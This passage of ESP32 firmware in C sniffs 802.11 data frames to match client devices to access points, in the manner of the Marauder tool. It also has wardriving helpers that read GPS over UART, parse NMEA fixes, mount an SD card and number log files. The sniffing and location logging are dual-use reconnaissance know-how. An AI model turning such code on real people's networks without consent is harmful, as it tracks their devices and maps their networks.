                        MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: REJECTED - AP list full, cannot create new AP", packet_counter);
                    }
                }
            }
        }
        return;
    }
    
    // Process DATA packets using 802.11 ToDS/FromDS logic (like Marauder)
    if (type == WIFI_PKT_DATA) {
        if (should_debug) printf("DEBUG: Processing DATA packet %lu\n", packet_counter);
        
        uint8_t *client_mac = NULL;
        uint8_t *ap_mac = NULL;
        
        if (sniff_debug) {
            MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: Processing DATA packet, ToDS=%d, FromDS=%d", 
                       packet_counter, to_ds, from_ds);
        }
        
        // Determine AP and client MAC based on ToDS/FromDS bits (802.11 standard)
        if (to_ds && !from_ds) {
            // STA -> AP: addr1=AP, addr2=STA, addr3=DA
            ap_mac = addr1;      // Destination is AP
            client_mac = addr2;  // Source is client
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: STA->AP direction", packet_counter);
            }
        } else if (!to_ds && from_ds) {
            // AP -> STA: addr1=STA, addr2=AP, addr3=SA  
            ap_mac = addr2;      // Source is AP
            client_mac = addr1;  // Destination is client
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: AP->STA direction", packet_counter);
            }
        } else if (!to_ds && !from_ds) {
            // IBSS (ad-hoc): addr1=DA, addr2=SA, addr3=BSSID
            ap_mac = addr3;      // BSSID
            client_mac = addr2;  // Source
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: IBSS direction", packet_counter);
            }
        } else {
            // WDS (to_ds && from_ds) - skip for now
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: REJECTED - WDS frame (ToDS=1, FromDS=1)", packet_counter);
            }
            return;
        }
        
        if (sniff_debug) {
            MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: AP MAC: %02X:%02X:%02X:%02X:%02X:%02X, Client MAC: %02X:%02X:%02X:%02X:%02X:%02X", 
                       packet_counter, 
                       ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5],
                       client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5]);
        }
        
        // Skip multicast/broadcast client MAC
        if (is_multicast_mac(client_mac)) {
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: REJECTED - client is multicast/broadcast", packet_counter);
            }
            return;
        }
        
        // Skip our own device as client
        if (is_own_device_mac(client_mac)) {
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: REJECTED - client is our own device", packet_counter);
            }
            return;
        }
        
        // Find the AP in our known list
        int ap_index = -1;
        if (should_debug) printf("DEBUG: Searching %d APs for match\n", sniffer_ap_count);
        
        for (int i = 0; i < sniffer_ap_count; i++) {
            if (memcmp(sniffer_aps[i].bssid, ap_mac, 6) == 0) {
                ap_index = i;
                if (should_debug) printf("DEBUG: Found AP match at index %d\n", i);
                break;
            }
        }
        
        // If AP not found, try to add it dynamically (like Marauder does)
        if (ap_index < 0 && sniffer_ap_count < MAX_SNIFFER_APS) {
            ap_index = sniffer_ap_count++;
            memcpy(sniffer_aps[ap_index].bssid, ap_mac, 6);
            snprintf(sniffer_aps[ap_index].ssid, sizeof(sniffer_aps[ap_index].ssid), 
                    "Unknown_%02X%02X", ap_mac[4], ap_mac[5]); // Use last 2 bytes for unique name
            sniffer_aps[ap_index].channel = sniffer_current_channel;
            sniffer_aps[ap_index].authmode = WIFI_AUTH_OPEN; // Unknown
            sniffer_aps[ap_index].rssi = pkt->rx_ctrl.rssi;
            sniffer_aps[ap_index].client_count = 0;
            sniffer_aps[ap_index].last_seen = esp_timer_get_time() / 1000;
            
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: CREATED new AP %s for BSSID %02X:%02X:%02X:%02X:%02X:%02X", 
                           packet_counter, sniffer_aps[ap_index].ssid,
                           ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
            }
        }
        
        if (ap_index >= 0) {
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: ACCEPTED - Adding client %02X:%02X:%02X:%02X:%02X:%02X to AP %s", 
                           packet_counter, client_mac[0], client_mac[1], client_mac[2], 
                           client_mac[3], client_mac[4], client_mac[5], sniffer_aps[ap_index].ssid);
            }
            add_client_to_ap(ap_index, client_mac, pkt->rx_ctrl.rssi);
        } else {
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: REJECTED - AP list full (%d/%d), cannot add new AP %02X:%02X:%02X:%02X:%02X:%02X", 
                           packet_counter, sniffer_ap_count, MAX_SNIFFER_APS,
                           ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
            }
        }
    }
}

// === WARDRIVE HELPER FUNCTIONS ===

static esp_err_t init_gps_uart(void) {
    uart_config_t uart_config = {
        .baud_rate = 9600,
        .data_bits = UART_DATA_8_BITS,
        .parity = UART_PARITY_DISABLE,
        .stop_bits = UART_STOP_BITS_1,
        .flow_ctrl = UART_HW_FLOWCTRL_DISABLE,
        .source_clk = UART_SCLK_DEFAULT,
    };
    
    ESP_ERROR_CHECK(uart_driver_install(GPS_UART_NUM, GPS_BUF_SIZE * 2, 0, 0, NULL, 0));
    ESP_ERROR_CHECK(uart_param_config(GPS_UART_NUM, &uart_config));
    ESP_ERROR_CHECK(uart_set_pin(GPS_UART_NUM, GPS_TX_PIN, GPS_RX_PIN, UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE));
    
    return ESP_OK;
}

static esp_err_t init_sd_card(void) {
    esp_err_t ret;
    
    // Options for mounting the filesystem (optimized for low memory)
    esp_vfs_fat_sdmmc_mount_config_t mount_config = {
        .format_if_mount_failed = false,  // Don't format automatically to save memory
        .max_files = 3,                   // Reduced from 10 to 3 to save memory
        .allocation_unit_size = 0,        // Use default (512 bytes) to save memory
        .disk_status_check_enable = false
    };
    
    sdmmc_card_t *card;
    const char mount_point[] = "/sdcard";
    
    // Configure SPI bus (balanced for SD card requirements and memory)
    spi_bus_config_t bus_cfg = {
        .mosi_io_num = SD_MOSI_PIN,
        .miso_io_num = SD_MISO_PIN,
        .sclk_io_num = SD_CLK_PIN,
        .quadwp_io_num = -1,
        .quadhd_io_num = -1,
        .max_transfer_sz = 4096,  // SD card needs at least 4KB for sector operations
    };
    
    ret = spi_bus_initialize(SPI2_HOST, &bus_cfg, SPI_DMA_CH_AUTO);  // DMA required for SD card
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SPI bus: %s", esp_err_to_name(ret));
        return ret;
    }
    
    // Initialize the SD card host
    sdmmc_host_t host = SDSPI_HOST_DEFAULT();
    host.slot = SPI2_HOST;
    
    sdspi_device_config_t slot_config = SDSPI_DEVICE_CONFIG_DEFAULT();
    slot_config.gpio_cs = SD_CS_PIN;
    slot_config.host_id = host.slot;
    
    ret = esp_vfs_fat_sdspi_mount(mount_point, &host, &slot_config, &mount_config, &card);
    
    if (ret != ESP_OK) {
        if (ret == ESP_FAIL) {
            MY_LOG_INFO(TAG, "Failed to mount filesystem. If you want the card to be formatted, set format_if_mount_failed = true.");
        } else {
            MY_LOG_INFO(TAG, "Failed to initialize the card (%s). Make sure SD card lines have pull-up resistors in place.", esp_err_to_name(ret));
        }
        return ret;
    }
    
    // Print card info
    MY_LOG_INFO(TAG, "SD card mounted successfully");
    sdmmc_card_print_info(stdout, card);
    
    // Test file creation to verify write access
    FILE *test_file = fopen("/sdcard/test.txt", "w");
    if (test_file != NULL) {
        fprintf(test_file, "Test write\n");
        fclose(test_file);
        MY_LOG_INFO(TAG, "SD card write test successful");
        // Clean up test file
        unlink("/sdcard/test.txt");
    } else {
        MY_LOG_INFO(TAG, "SD card write test failed, errno: %d (%s)", errno, strerror(errno));
    }
    
    return ESP_OK;
}

static bool parse_gps_nmea(const char* nmea_sentence) {
    if (!nmea_sentence || strlen(nmea_sentence) < 10) {
        return false;
    }
    
    // Parse GPGGA sentence for basic GPS data
    if (strncmp(nmea_sentence, "$GPGGA", 6) == 0 || strncmp(nmea_sentence, "$GNGGA", 6) == 0) {
        char sentence[256];
        strncpy(sentence, nmea_sentence, sizeof(sentence) - 1);
        sentence[sizeof(sentence) - 1] = '\0';
        
        char *token = strtok(sentence, ",");
        int field = 0;
        float lat_deg = 0, lat_min = 0;
        float lon_deg = 0, lon_min = 0;
        char lat_dir = 'N', lon_dir = 'E';
        int quality = 0;
        float altitude = 0;
        float hdop = 1.0;
        
        while (token != NULL) {
            switch (field) {
                case 2: // Latitude DDMM.MMMM
                    if (strlen(token) > 4) {
                        lat_deg = (token[0] - '0') * 10 + (token[1] - '0');
                        lat_min = atof(token + 2);
                    }
                    break;
                case 3: // Latitude direction
                    lat_dir = token[0];
                    break;
                case 4: // Longitude DDDMM.MMMM
                    if (strlen(token) > 5) {
                        lon_deg = (token[0] - '0') * 100 + (token[1] - '0') * 10 + (token[2] - '0');
                        lon_min = atof(token + 3);
                    }
                    break;
                case 5: // Longitude direction
                    lon_dir = token[0];
                    break;
                case 6: // GPS quality
                    quality = atoi(token);
                    break;
                case 8: // HDOP
                    hdop = atof(token);
                    break;
                case 9: // Altitude
                    altitude = atof(token);
                    break;
            }
            token = strtok(NULL, ",");
            field++;
        }
        
        if (quality > 0) {
            // Convert to decimal degrees
            current_gps.latitude = lat_deg + lat_min / 60.0;
            if (lat_dir == 'S') current_gps.latitude = -current_gps.latitude;
            
            current_gps.longitude = lon_deg + lon_min / 60.0;
            if (lon_dir == 'W') current_gps.longitude = -current_gps.longitude;
            
            current_gps.altitude = altitude;
            current_gps.accuracy = hdop * 4.0; // Rough accuracy estimate
            current_gps.valid = true;
            
            return true;
        }
    }
    
    return false;
}

static void get_timestamp_string(char* buffer, size_t size) {
    // For now, use a simple counter-based timestamp
    // In a real implementation, you'd use RTC or NTP time
    static uint32_t timestamp_counter = 0;
    timestamp_counter++;
    
    // Format as a simple date-time string
    snprintf(buffer, size, "2025-09-26 %02d:%02d:%02d", 
             (int)((timestamp_counter / 3600) % 24),
             (int)((timestamp_counter / 60) % 60), 
             (int)(timestamp_counter % 60));
}

static const char* get_auth_mode_wiggle(wifi_auth_mode_t mode) {
    switch(mode) {
        case WIFI_AUTH_OPEN:
            return "Open";
        case WIFI_AUTH_WEP:
            return "WEP";
        case WIFI_AUTH_WPA_PSK:
            return "WPA_PSK";
        case WIFI_AUTH_WPA2_PSK:
            return "WPA2_PSK";
        case WIFI_AUTH_WPA_WPA2_PSK:
            return "WPA_WPA2_PSK";
        case WIFI_AUTH_WPA2_ENTERPRISE:
            return "WPA2_ENTERPRISE";
        case WIFI_AUTH_WPA3_PSK:
            return "WPA3_PSK";
        case WIFI_AUTH_WPA2_WPA3_PSK:
            return "WPA2_WPA3_PSK";
        case WIFI_AUTH_WAPI_PSK:
            return "WAPI_PSK";
        default:
            return "Unknown";
    }
}

static bool wait_for_gps_fix(int timeout_seconds) {
    int elapsed = 0;
    current_gps.valid = false;
    
    MY_LOG_INFO(TAG, "Waiting for GPS fix (timeout: %d seconds)...", timeout_seconds);
    
    while (elapsed < timeout_seconds) {
        // Check for stop request
        if (operation_stop_requested) {
            MY_LOG_INFO(TAG, "GPS wait: Stop requested, terminating...");
            return false;
        }
        
        // Read GPS data
        int len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(1000));
        if (len > 0) {
            wardrive_gps_buffer[len] = '\0';
            char* line = strtok(wardrive_gps_buffer, "\r\n");
            while (line != NULL) {
                if (parse_gps_nmea(line)) {
                    if (current_gps.valid) {
                        return true;  // GPS fix obtained
                    }
                }
                line = strtok(NULL, "\r\n");
            }
        }
        
        elapsed++;
        if (elapsed % 10 == 0) {  // Print status every 10 seconds
            MY_LOG_INFO(TAG, "Still waiting for GPS fix... (%d/%d seconds)", elapsed, timeout_seconds);
        }
    }
    
    return false;  // Timeout reached without GPS fix
}

static int find_next_wardrive_file_number(void) {
    int max_number = 0;
    char filename[32];
    MY_LOG_INFO(TAG, "Scanning for existing wardrive log files...");
    // Scan through possible file numbers to find the highest existing one
    for (int i = 1; i <= 9999; i++) {
        snprintf(filename, sizeof(filename), "/sdcard/w%d.log", i);
        
        struct stat file_stat;
        if (stat(filename, &file_stat) == 0) {
            // File exists, update max_number
            max_number = i;
            MY_LOG_INFO(TAG, "Found existing file: w%d.log", i);
        } else {
            // First non-existing file number, we can break here for efficiency
            break;
        }
    }
    
    int next_number = max_number + 1;
    MY_LOG_INFO(TAG, "Highest existing file number: %d, next will be: %d", max_number, next_number);
    
    return next_number;
}


